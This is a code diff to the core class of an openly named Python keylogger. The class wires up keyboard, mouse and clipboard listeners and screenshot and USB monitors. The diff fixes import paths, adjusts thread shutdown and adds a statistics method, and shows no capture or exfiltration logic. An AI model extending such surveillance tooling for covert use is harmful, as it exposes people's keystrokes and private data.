@@ -103,9 +103,9 @@ class KeyloggerCore:
         """Start input listeners based on configuration."""
         try:
             # Import listeners here to avoid circular imports
-            from ..listeners.keyboard_listener import KeyboardListener
-            from ..listeners.mouse_listener import MouseListener
-            from ..listeners.clipboard_listener import ClipboardListener
+            from listeners.keyboard_listener import KeyboardListener
+            from listeners.mouse_listener import MouseListener
+            from listeners.clipboard_listener import ClipboardListener
             
             # Start keyboard listener
             if self.config.is_feature_enabled('key_logging'):
@@ -133,10 +133,10 @@ class KeyloggerCore:
         """Start monitoring threads for various features."""
         try:
             # Import monitors here to avoid circular imports
-            from ..utils.window_monitor import WindowMonitor
-            from ..utils.screenshot_monitor import ScreenshotMonitor
-            from ..utils.usb_monitor import USBMonitor
-            from ..utils.performance_monitor import PerformanceMonitor
+            from utils.window_monitor import WindowMonitor
+            from utils.screenshot_monitor import ScreenshotMonitor
+            from utils.usb_monitor import USBMonitor
+            from utils.performance_monitor import PerformanceMonitor
             
             # Window monitoring
             if self.config.is_feature_enabled('window_tracking'):
@@ -247,7 +247,7 @@ class KeyloggerCore:
             
             # Shutdown thread pool
             if self.thread_pool:
-                self.thread_pool.shutdown(wait=True, timeout=5.0)
+                self.thread_pool.shutdown(wait=True)
             
             logger.debug("Resource cleanup completed")
             
@@ -355,3 +355,19 @@ class KeyloggerCore:
         except Exception as e:
             logger.error(f"Error reloading configuration: {e}")
             raise
+
+    def get_stats(self) -> Dict[str, Any]:
+        """Get keylogger statistics."""
+        log_file = self.config.get('logging.file_path', 'keylog.txt')
+        log_size_mb = 0.0
+        try:
+            log_size_mb = os.path.getsize(log_file) / (1024 * 1024)
+        except:
+            pass
+        return {
+            'total_events': self.session_stats['events_logged'],
+            'buffer_size': len(self.log_manager.log_buffer) if self.log_manager else 0,
+            'log_file_size_mb': log_size_mb,
+            'active_listeners': len(self.listeners),
+            'errors': self.session_stats['errors']
+        }
